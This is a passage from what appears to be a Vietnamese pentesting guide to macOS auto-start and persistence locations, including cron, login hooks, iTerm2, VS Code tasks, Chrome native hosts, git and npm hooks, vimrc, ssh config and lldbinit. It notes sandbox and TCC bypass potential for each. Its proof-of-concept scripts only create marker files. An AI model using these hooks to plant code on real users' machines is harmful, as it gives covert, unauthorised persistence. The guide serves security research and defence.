Các đường dẫn này áp dụng cho các bundle `.qlgenerator` đời cũ; [hướng dẫn kiến trúc Quick Look của Apple](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) mô tả thứ tự tìm kiếm và các loại tệp tương ứng. Các **app extension** Quick Look hiện nay được đóng gói cùng một ứng dụng và có quy tắc đăng ký cũng như thực thi khác. Việc một generator hiện diện không chứng minh rằng nó được chọn để xử lý loại tệp đó hoặc mã của nó chạy ngay trong Finder. Đường dẫn của generator đời cũ đã được kiểm tra dựa trên tài liệu và sự hiện diện của thư mục; không có generator nào được cài đặt hoặc tải trên máy Mac dùng cho nghiên cứu.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Cách này không hoạt động với tôi, dù dùng LoginHook của người dùng hay LogoutHook của root

**Bài viết**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- Bạn cần có khả năng thực thi lệnh như `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - Nằm trong `~/Library/Preferences/com.apple.loginwindow.plist`

Chúng đã bị deprecated nhưng có thể được dùng để thực thi lệnh khi người dùng đăng nhập.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Cài đặt này được lưu trong `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Để xóa nó:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Bản dành cho người dùng root được lưu trong **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Tại đây, bạn có thể tìm thấy các vị trí khởi chạy hữu ích cho **sandbox bypass**, cho phép bạn chỉ cần thực thi thứ gì đó bằng cách **ghi nó vào một file** và **trông chờ vào các điều kiện không phổ biến** như **các chương trình cụ thể được cài đặt, hành động “không thường gặp” của người dùng** hoặc môi trường cụ thể.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Tuy nhiên, bạn cần có khả năng thực thi binary `crontab`
  - Hoặc cần là root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- **`/usr/lib/cron/tabs/`**
  - Cần root để ghi trực tiếp. Không cần root nếu bạn có thể thực thi `crontab <file>`
  - **Kích hoạt**: Lịch trình trong crontab đã cài đặt. `at` và `periodic` là các cơ chế riêng biệt được đề cập bên dưới.

#### Mô tả & Khai thác

Liệt kê các cron job của **người dùng hiện tại** bằng lệnh:

```bash
crontab -l
```

plist launchd của daemon cron hệ thống có mục `QueueDirectories` trỏ đến `/usr/lib/cron/tabs`; đây là nơi lưu các crontab của người dùng đã cài đặt. Cần có quyền root để kiểm tra crontab của những người dùng khác:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

Trong một tài khoản dùng một lần, có thể cài một mục user cron chỉ chứa dấu đánh dấu bằng `crontab` rồi xóa sau khi quan sát. Chạy `crontab <file>` **sẽ thay thế toàn bộ crontab hiện có của tài khoản**, vì vậy hãy lưu và khôi phục crontab nếu tài khoản đó không phải tài khoản dùng một lần:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 từng được cấp quyền TCC

#### Vị trí

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Kích hoạt**: Khởi chạy iTerm2 với một Python API script đủ điều kiện trong thư mục đó
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Kích hoạt**: Khởi chạy iTerm2; hook khởi động AppleScript được ghi tài liệu riêng
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Kích hoạt**: Tạo một session bằng profile có command hoặc văn bản ban đầu gọi payload

#### Mô tả & Khai thác

[Hướng dẫn Python API hiện tại của iTerm2](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) ghi tài liệu về các script **Python** tự chạy trong `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Hướng dẫn này không xác nhận rằng một file thực thi `.sh` bất kỳ trong thư mục đó sẽ chạy. Trong một tài khoản dùng để thử nghiệm, hãy lưu nội dung sau thành `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[Hướng dẫn AppleScript iTerm2 hiện tại](https://iterm2.com/documentation-scripting.html) mô tả riêng `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, với đường dẫn dự phòng cũ `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` khi thư mục hiện đại không tồn tại. Một AppleScript chỉ chứa marker là:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Các ví dụ script này được đối chiếu với tài liệu của iTerm2, không chạy trong phiên desktop đang hoạt động. Sau khi kiểm thử trong một tài khoản dùng một lần, hãy xóa script thử nghiệm và `/tmp/ht-iterm-autolaunch-marker` hoặc `/tmp/iterm2-autolaunchscpt`, tương ứng.

Tùy chọn iTerm2 trong **`~/Library/Preferences/com.googlecode.iterm2.plist`** có thể chỉ định lệnh cho profile hoặc văn bản ban đầu. Văn bản sau được nhập vào một phiên; việc thực thi phụ thuộc vào shell diễn giải nó. [Tài liệu về profile của iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) mô tả lệnh chạy khi tạo một phiên mới bằng profile đó.

Có thể cấu hình thiết lập này trong phần cài đặt iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Và lệnh được phản ánh trong tùy chọn:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Để đánh giá an toàn, hãy kiểm tra profile đã chọn trong cài đặt iTerm2 hoặc đọc một bản sao của tệp tùy chọn. Thay đổi `Initial Text` trong một profile đang hoạt động sẽ ảnh hưởng đến các phiên của người dùng, vì vậy không có tùy chọn nào được thay đổi trên máy Mac nghiên cứu.

### xbar

Bài viết: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Nhưng xbar phải được cài đặt
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Nó yêu cầu quyền Accessibility

#### Vị trí

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Kích hoạt**: Khi xbar được chạy

#### Mô tả

Nếu chương trình phổ biến [**xbar**](https://github.com/matryer/xbar) được cài đặt, có thể viết một shell script trong **`~/Library/Application\ Support/xbar/plugins/`** để script đó được thực thi khi xbar khởi chạy:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Nhưng cần cài đặt Hammerspoon
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
  - Ứng dụng yêu cầu quyền Accessibility

#### Vị trí

- **`~/.hammerspoon/init.lua`**
  - **Kích hoạt**: Khi Hammerspoon được thực thi

#### Mô tả

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) là một nền tảng tự động hóa dành cho **macOS**, sử dụng **ngôn ngữ lập trình LUA** để vận hành. Đáng chú ý, nền tảng này hỗ trợ tích hợp toàn bộ mã AppleScript và thực thi shell script, giúp nâng cao đáng kể khả năng viết script.<sup>[[13]](#references)</sup>

Ứng dụng tìm một tệp duy nhất là `~/.hammerspoon/init.lua`; script sẽ được thực thi khi ứng dụng khởi động.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Nhưng BetterTouchTool phải được cài đặt
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Ứng dụng yêu cầu quyền Automation-Shortcuts và Accessibility

#### Vị trí

- Một tệp script **đã được tham chiếu** bởi preset BetterTouchTool đang bật, hoặc cấu hình của preset đó trong `~/Library/Application Support/BetterTouchTool/`. Đường dẫn script cụ thể phụ thuộc vào cách cấu hình preset.

[Tài liệu tham khảo về action của BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) mô tả các action shell-script và background-command. Sự kiện bàn phím, chuột, touch, widget hoặc sự kiện khác đã cấu hình phải xảy ra khi preset liên quan đang hoạt động; [hướng dẫn về trigger](https://docs.folivora.ai/docs/configuration/new-trigger/) trình bày cách kết hợp này. Một tệp bất kỳ trong thư mục application-support không phải là trigger. Một action đã cấu hình để tải script bên ngoài có thể ghi là mục tiêu ghi-to-execution hẹp hơn. Code chạy dưới tài khoản người dùng BetterTouchTool, tùy theo các quyền macOS thực tế của tài khoản đó. BetterTouchTool không có trong `/Applications` trên máy Mac dùng để nghiên cứu, vì vậy không có preset nào được thay đổi hoặc chạy tại chỗ.

### Alfred

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Nhưng Alfred phải được cài đặt
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Ứng dụng yêu cầu các quyền Automation, Accessibility và thậm chí cả Full-Disk access

#### Vị trí

- Một script hoặc tệp **đã được tham chiếu** bởi workflow Alfred đã cài đặt, hoặc workflow đó trong thư mục `Alfred.alfredpreferences` do người dùng cấu hình. Thư mục preferences có thể được đồng bộ và không có một đường dẫn cố định dùng chung cho mọi hệ thống.

[Hướng dẫn workflow của Alfred](https://www.alfredapp.com/help/workflows/) mô tả yêu cầu Powerpack và cách cài đặt qua giao diện người dùng. Hotkey, keyword hoặc trigger khác đã cấu hình của workflow được cài đặt phải được kích hoạt; [ví dụ hotkey của Alfred](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) minh họa một action script. [Tài liệu tham khảo về môi trường của Alfred](https://www.alfredapp.com/help/workflows/script-environment-variables/) cho biết đường dẫn preferences được chọn thông qua `alfred_preferences`. Đưa một tệp workflow chưa đăng ký vào một thư mục bất kỳ không chứng minh rằng workflow đó sẽ được cài đặt hoặc chạy. Code chạy dưới tài khoản Alfred đang đăng nhập, với các quyền macOS thực tế của tài khoản đó. Alfred không có trong `/Applications` trên máy Mac dùng để nghiên cứu, vì vậy đường dẫn này chỉ được đánh giá dựa trên tài liệu.

### Raycast Script Commands và làm mới extension

- **Mục tiêu ghi:** Một script có thể thực thi trong thư mục **đã được thêm** tại Raycast Settings → Script Commands. Raycast không quét một thư mục mới tạo bất kỳ. [Hướng dẫn Script Commands của Raycast](https://manual.raycast.com/script-commands) mô tả cách đăng ký thư mục.
- **Trigger và danh tính:** Người dùng gọi command đã được lập chỉ mục, hotkey hoặc fallback đã cấu hình gọi command đó, hoặc Raycast làm mới một script `inline` theo `@raycast.refreshTime` đã cấu hình. Script chạy dưới tài khoản Raycast đang đăng nhập thông qua trình thông dịch của nó. [Tài liệu tham khảo metadata upstream](https://github.com/raycast/script-commands#metadata) giới hạn việc làm mới tự động ở các command inline, còn [manifest extension của Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) hỗ trợ riêng một `interval` cho các command extension `no-view` hoặc `menu-bar` đã cài đặt. Chỉ thêm một script command thông thường không khiến script được lên lịch chạy.

Với một tài khoản dùng một lần có thư mục script đã đăng ký, script inline chỉ tạo marker là:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Lưu nó vào thư mục đã đăng ký, cấp quyền thực thi và để Raycast làm mới. Sau đó xóa tệp đó cùng với `/tmp/ht-raycast-refresh-marker`. Không tìm thấy Raycast dưới tên thông thường trong `/Applications` trên máy Mac nghiên cứu, vì vậy nội dung này dựa trên tài liệu và chưa được chạy cục bộ. Quyền Trợ năng, Tự động hóa và quyền truy cập tệp vẫn tùy thuộc vào các lời nhắc cấp quyền của macOS.

### Tác vụ workspace tự động của Visual Studio Code

- **Nơi ghi:** `.vscode/tasks.json` bên trong workspace mà người dùng sẽ mở.
- **Kích hoạt:** Mở workspace đó trong VS Code, nhưng chỉ khi thư mục được tin cậy **và** tác vụ tự động đã được cho phép. Workspace không đáng tin cậy sẽ không bao giờ chạy tác vụ tự động; theo mặc định, VS Code sẽ hỏi người dùng trước lần chạy tự động đầu tiên. [Tài liệu về tác vụ của VS Code](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) và [tài liệu về Workspace Trust](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) mô tả cả hai điều kiện này.
- **Danh tính thực thi:** Tài khoản của người dùng VS Code, thông qua tiến trình tác vụ đã cấu hình. Đây là hoạt động thực thi riêng của ứng dụng, không phải cơ chế duy trì quyền truy cập khi đăng nhập.

Trong một **workspace mới, dùng một lần**, đặt tác vụ chỉ tạo marker này vào `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Sau khi mở workspace đáng tin cậy và cho phép các tác vụ tự động, hãy kiểm tra `.autostart-task-ran`. Xóa mục tác vụ và marker để dọn dẹp. **Điều này đã được xác minh dựa trên tài liệu của Microsoft và bundle VS Code 1.139.1 đã cài đặt; không chạy trong phiên desktop đang hoạt động.**

### Các host native messaging của Chrome

- **Đích ghi:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` cho người dùng hiện tại, hoặc `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` cho tất cả người dùng (cần quyền admin để ghi). Chromium và Chrome for Testing sử dụng các thư mục khác nhau; xem [bảng đường dẫn hiện tại của Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Kích hoạt:** Một extension Chrome đã cài đặt có quyền `nativeMessaging` gọi `chrome.runtime.connectNative()` hoặc `chrome.runtime.sendNativeMessage()` bằng chính xác tên host trong manifest. Sau đó, Chrome khởi chạy tệp thực thi của host. Chỉ mở Chrome không thực thi một native host mới bất kỳ; tạo manifest mà không có extension gọi đến thì không có tác dụng. [Hướng dẫn native messaging của Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) mô tả quá trình bắt tay này.
- **Danh tính thực thi:** Tài khoản người dùng Chrome. Manifest phải chỉ định đường dẫn tuyệt đối đến tệp thực thi và cho phép rõ ràng origin của extension gọi đến.

Trong một tài khoản trình duyệt dùng riêng để thử nghiệm với extension kiểm thử, cặp tệp sau minh họa mối liên kết từ ghi đến thực thi. Tên tệp của manifest phải khớp với `name` của nó, và phải thay `TEST_EXTENSION_ID` bằng ID thực tế của extension đó:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Lưu JSON này thành `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Tệp thực thi chỉ chứa marker tại `path` trong manifest có thể chứa:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Sau khi extension kiểm thử gọi `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` từ service worker hoặc trang extension, marker xác nhận host đã khởi chạy. Host tối giản này không triển khai giao thức phản hồi có tiền tố độ dài của Chrome, vì vậy extension có thể báo lỗi nhắn tin sau khi marker được ghi. Xóa manifest kiểm thử, host và marker để dọn dẹp. Trên macOS 26.5.2, ứng dụng Chrome và cả hai thư mục manifest đều hiện diện; **profile Chrome đang hoạt động không bị sửa đổi hoặc sử dụng để kiểm thử**.

### Lệnh sự kiện phím Karabiner-Elements

- **Đích ghi:** `~/.config/karabiner/karabiner.json` trong tài khoản đã cài đặt và đang chạy Karabiner-Elements. [Hướng dẫn vị trí tệp của Karabiner](https://karabiner-elements.pqrs.org/docs/json/location/) cho biết ứng dụng theo dõi và tải lại tệp này sau khi ghi. Các tệp JSON trong `assets/complex_modifications` chỉ là preset có thể nhập; chỉ ghi một tệp vào đó sẽ không kích hoạt quy tắc.
- **Kích hoạt:** Sự kiện phím được cấu hình sau khi quy tắc có hiệu lực. [Tài liệu tham khảo `to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) mô tả việc thực thi lệnh. Đây không phải là thực thi mã khi đăng nhập hoặc mỗi khi có tệp được ghi.
- **Danh tính thực thi:** Người dùng đã đăng nhập đang chạy tiến trình người dùng của Karabiner. Các quyền được cấp cho chính ứng dụng và mọi quyền truy cập TCC phụ thuộc vào ứng dụng và phiên bản.

Trong tài khoản kiểm thử dùng một lần, hãy thêm đối tượng quy tắc này vào mảng `complex_modifications.rules` của profile được chọn trong `karabiner.json`, đồng thời giữ nguyên phần còn lại của profile đó. Nhấn F18 để tạo marker vô hại, sau đó xóa quy tắc này và marker. Chọn F18 để tránh thay thế một phím gõ thông thường:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements chưa được cài đặt trong `/Applications` trên máy thử nghiệm macOS 26.5.2, vì vậy đây là PoC dựa trên tài liệu chứ không phải kết quả chạy thực tế tại chỗ.

### Git hooks trong một repository cục bộ

- **Đích ghi:** Một hook có quyền thực thi như `<repo>/.git/hooks/post-checkout`. Nếu `core.hooksPath` đã được thiết lập, hãy dùng thư mục đã cấu hình đó. Hook được commit dưới dạng tệp mã nguồn được theo dõi thông thường sẽ không tự động được cài đặt vào bản clone.
- **Kích hoạt:** Thao tác Git tương ứng. Ví dụ, `post-checkout` chạy sau `git checkout` hoặc `git switch`, và cũng có thể chạy sau khi clone hoặc tạo worktree. [Git's hook reference](https://git-scm.com/docs/githooks) liệt kê các sự kiện và yêu cầu về quyền thực thi; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) thay đổi thư mục tra cứu.
- **Danh tính thực thi:** Tài khoản chạy Git. Hook chỉ có thể thực thi nếu thư mục hooks hiệu lực của repository cho phép tác nhân ghi vào và sau đó người dùng thực hiện thao tác Git liên quan.

PoC chỉ tạo dấu hiệu này tạo một repository hoàn toàn dùng một lần, cài đặt một hook rồi chuyển nhánh. PoC đã chạy thành công với Apple Git 2.50.1 trên macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm lifecycle scripts trong một dự án

- **Mục tiêu ghi:** Map `scripts` trong `package.json` của một dự án có thể ghi, hoặc một package dependency đã cài đặt có lifecycle script sẽ được người dùng chạy. Đây là hook trong quy trình phát triển, không phải cơ chế thực thi khi mở một thư mục.
- **Kích hoạt và danh tính:** Lệnh `npm install` hoặc `npm ci` chạy sau đó, khi lifecycle scripts được cho phép, sẽ chạy `preinstall`, `install` và `postinstall` với quyền của người dùng gọi npm. Lệnh `npm run <name>` thông thường cũng chạy các script `pre<name>` và `post<name>` tương ứng. [Tài liệu tham khảo về lifecycle của npm](https://docs.npmjs.com/cli/v11/using-npm/scripts) liệt kê các sự kiện; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) có thể vô hiệu hóa các install lifecycle script. Cài đặt phiên bản và chính sách có thể làm thay đổi những gì được phép, vì vậy hãy kiểm tra phiên bản npm mục tiêu.

PoC chỉ tạo marker này được chạy bằng npm cục bộ trong một thư mục trống dùng riêng cho thử nghiệm. PoC không tải dependency xuống hoặc thay đổi dự án của người dùng:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Điều này khác với các tệp khởi động của trình thông dịch Python: npm phải thực hiện thao tác cài đặt hoặc chạy liên quan, trong khi mã `site` của Python có thể được tải khi gọi trình thông dịch thông thường. Tương tự, các target `Makefile` chung và định nghĩa tác vụ build yêu cầu người dùng hoặc một công cụ đã được cấu hình sẵn gọi target đó; chúng không phải là các đường dẫn tự khởi động riêng của OS.

### Cấu hình khởi động Vim

- **Đích ghi:** `~/.vimrc` của người dùng sẽ khởi chạy Vim (hoặc một tệp khởi động khác được chọn theo thứ tự khởi tạo của Vim). [Tài liệu tham khảo về khởi động của Vim](https://vimhelp.org/starting.txt.html) mô tả tệp này và các tùy chọn ghi đè `VIMINIT`/`EXINIT`.
- **Kích hoạt:** Lần khởi động Vim thông thường tiếp theo sẽ tải cấu hình này. Tùy chọn `-u NONE` của Vim bỏ qua vimrc của người dùng. Đây là thực thi riêng cho trình soạn thảo, không phải trigger đăng nhập OS.
- **Danh tính thực thi:** Tài khoản của người dùng Vim.

PoC độc lập sau đây được chạy trên `/usr/bin/vim` của macOS; nó không ghi vào tùy chọn Vim hay tài liệu đang mở thực tế:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim có đường dẫn cấu hình người dùng riêng, `$XDG_CONFIG_HOME/nvim/init.lua` hoặc `init.vim`, đồng thời tải các script trong thư mục runtime `plugin/` theo [tài liệu khởi động](https://neovim.io/doc/user/starting/). Neovim không được cài đặt trên máy thử nghiệm macOS 26.5.2, nên biến thể này không được chạy tại đó.

### Các lệnh cấu hình SSH client

- **Đích ghi:** `~/.ssh/config` hoặc một tệp khác đã được tệp này include. Đây là tệp cấu hình **client**; nó tách biệt với `~/.ssh/rc` phía server được mô tả bên dưới.
- **Kích hoạt:** Một lệnh gọi `ssh` khớp điều kiện. `Match exec` chạy lệnh cục bộ khi client đánh giá cấu hình, kể cả với `ssh -G`, lệnh in cấu hình mà không kết nối. `ProxyCommand` chạy khi client thiết lập kết nối khớp điều kiện. `LocalCommand` chỉ chạy sau khi kết nối thành công và yêu cầu `PermitLocalCommand yes` (mặc định là `no`). Các lệnh này có thời điểm chạy và điều kiện tiên quyết khác nhau; chỉ ghi tệp thì không kích hoạt chúng. Xem [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5) chính thức.
- **Danh tính thực thi:** Người dùng cục bộ chạy `ssh`. Cần có host khớp, tệp cấu hình phù hợp và mọi kết nối bắt buộc. `ssh -F` có thể chọn một tệp cấu hình khác.

PoC chỉ dùng marker này được chạy bằng SSH client của Apple trên macOS 26.5.2. `-G` kiểm tra `Match exec` mà không tạo kết nối mạng hoặc đọc cấu hình SSH thực của người dùng:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Các tệp khởi tạo debugger

- **Đích ghi:** `~/.lldbinit` hoặc tệp dành riêng cho ứng dụng có độ ưu tiên cao hơn, chẳng hạn `~/.lldbinit-lldb`. LLDB đọc một tệp khi debugger khởi động. Mặc định, `.lldbinit` trong thư mục hiện tại **không** được thực thi; người dùng phải bật `target.load-cwd-lldbinit` hoặc truyền `--local-lldbinit`. Xem [tài liệu LLDB](https://lldb.llvm.org/man/lldb.html).
- **Kích hoạt và danh tính:** Người dùng khởi chạy LLDB mà không có `--no-lldbinit`; các lệnh chạy với quyền của người dùng đó. Chỉ mở một project không có nghĩa là `.lldbinit` của project sẽ chạy.

Bài kiểm tra chỉ dùng marker sau đây được chạy với LLDB trên macOS 26.5.2, trong một thư mục home và thư mục làm việc được cô lập:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**, [tài liệu khởi động upstream](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) liệt kê `$HOME/Library/Preferences/gdb/gdbinit`, sau đó là `~/.gdbinit` trên macOS. Tệp `.gdbinit` trong thư mục hiện tại chịu sự chi phối của [đường dẫn an toàn auto-load](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), còn `-nx`/`-nh` sẽ bỏ qua các tệp khởi tạo. GDB chưa được cài đặt trên máy Mac thử nghiệm, nên biến thể này chưa được chạy cục bộ.

### SSHRC

Bài viết: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Nhưng SSH phải được bật và sử dụng
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH từng có quyền FDA

#### Vị trí

- **`~/.ssh/rc`**
  - **Kích hoạt**: Đăng nhập qua SSH
- **`/etc/ssh/sshrc`**
  - Cần quyền root
  - **Kích hoạt**: Đăng nhập qua SSH

> [!CAUTION]
> Để bật SSH cần có quyền Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Mô tả & Khai thác

Theo mặc định, trừ khi có `PermitUserRC no` trong `/etc/ssh/sshd_config`, khi người dùng **đăng nhập qua SSH**, các script **`/etc/ssh/sshrc`** và **`~/.ssh/rc`** sẽ được thực thi.<sup>[[14]](#references)</sup>

### **Login Items**

Bài viết: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Nhưng bạn cần thực thi `osascript` kèm args
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- **Ứng dụng helper login item đã đăng ký:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (vị trí đóng gói phổ biến).
  - **Kích hoạt:** Việc đăng ký có thể khởi chạy helper ngay lập tức; sau đó helper sẽ khởi chạy ở các lần người dùng đăng nhập tiếp theo, tùy thuộc vào phê duyệt.
- **Agent/daemon được đóng gói đã đăng ký:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` hoặc `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Kích hoạt:** Agent được phê duyệt có thể khởi chạy khi đăng ký và trong các lần đăng nhập sau; daemon được phê duyệt sẽ khởi chạy khi khởi động máy. Daemon cần admin phê duyệt.

#### Mô tả

